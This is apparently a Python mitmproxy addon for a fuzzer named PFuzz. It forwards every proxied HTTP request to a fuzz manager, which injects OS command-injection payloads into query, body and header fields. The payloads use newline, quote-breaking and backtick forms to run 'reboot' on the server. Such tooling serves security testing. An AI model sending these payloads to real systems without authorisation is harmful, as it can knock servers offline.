from mitmproxy import ctx
from mitmproxy import http

from PFuzz.Utils import PFuzzMitmReqToRequest
from PFuzz.Config import PFuzzConfig
from PFuzz.PFuzzManagerClient import PFuzzManagerClient
from urllib.parse import quote

import requests

# console.view.eventlog
# PFuzz XML RPC Connection
PFuzzConn = PFuzzManagerClient()

rce_payload = 'reboot'

# query_payloads = ['\n{}\n'.format(rce_payload),'";{};echo"'.format(rce_payload),'"\n{}\necho"'.format(rce_payload),
#                     '";{};echo"'.format(rce_payload),'";{};echo"'.format(rce_payload),
#                     '`{}`'.format(rce_payload)]
# header_payloads = {}
# body_payloads = ['\n{}\n'.format(rce_payload),'";{};echo"'.format(rce_payload),'"\n{}\necho"'.format(rce_payload),
#                     '";{};echo"'.format(rce_payload),'";{};echo"'.format(rce_payload),
#                     '`{}`'.format(rce_payload)]


query_payloads = [quote('\n{}\n'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),quote('"\n{}\necho"'.format(rce_payload)),
                    quote('";{};echo"'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),
                    quote('`{}`'.format(rce_payload))]
header_payloads = {}
body_payloads = [quote('\n{}\n'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),quote('"\n{}\necho"'.format(rce_payload)),
                    quote('";{};echo"'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),
                    quote('`{}`'.format(rce_payload))]


RuntimeFuzzConfig = {
    'FUZZ_TYPE':PFuzzConfig.HTTP_FUZZ_BODY|PFuzzConfig.HTTP_FUZZ_QUERY|PFuzzConfig.HTTP_FUZZ_HEADER|PFuzzConfig.HTTP_FUZZ_CROSS,
    'FUZZ_ARGS':{
        PFuzzConfig.QUERY_FUZZ_ARGS:query_payloads,
        PFuzzConfig.HEADER_FUZZ_ARGS:header_payloads,
        PFuzzConfig.BODY_FUZZ_ARGS:body_payloads
    }
}



class PFuzzRpcMitmproxyAddon:

    def request(self,flow: http.HTTPFlow):
        # mitmproxt event hook

        req = PFuzzMitmReqToRequest(flow.request)
        if flow.request.scheme == 'https':
            proto = PFuzzConfig.PROTOCOL_HTTPS
        else:
            proto = PFuzzConfig.PROTOCOL_HTTP

        # XML RPC will convert Request into dict at server.  
        PFuzzConn.addHttpTarget(proto,RuntimeFuzzConfig['FUZZ_TYPE'],req,RuntimeFuzzConfig['FUZZ_ARGS'])


addons = [
    PFuzzRpcMitmproxyAddon()
]

if __name__ == "__main__":
    print("""

""")